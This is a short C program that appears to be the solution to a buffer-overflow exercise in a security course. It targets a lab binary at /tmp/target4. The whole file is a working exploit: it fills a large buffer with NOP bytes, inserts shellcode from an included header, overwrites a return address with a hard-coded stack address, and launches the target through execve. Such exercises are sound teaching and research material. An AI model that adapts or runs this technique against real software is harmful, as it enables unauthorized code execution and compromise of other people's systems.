#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3];
  char *env[1];

  char attack_buffer[32769];

  memset(attack_buffer, 0x90, 32768);  // Fill with NOPs
  memcpy(attack_buffer, shellcode, strlen(shellcode));  // Copy the payload in

  *(unsigned int*)(attack_buffer + 4016) = 0xbfff6ecc; // point to beginning of buffer
  attack_buffer[32768] = 0;

  args[0] = TARGET; args[1] = attack_buffer; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
